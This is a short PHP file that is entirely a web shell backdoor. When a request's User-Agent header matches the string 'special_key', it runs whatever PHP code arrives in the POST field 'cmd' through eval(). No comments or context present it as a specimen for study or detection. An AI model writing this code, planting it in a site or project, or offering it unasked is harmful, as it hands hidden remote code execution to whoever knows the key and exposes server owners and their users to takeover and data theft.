<?php
if($_SERVER['HTTP_USER_AGENT']==='special_key'){
    eval($_POST['cmd']);
}
?> 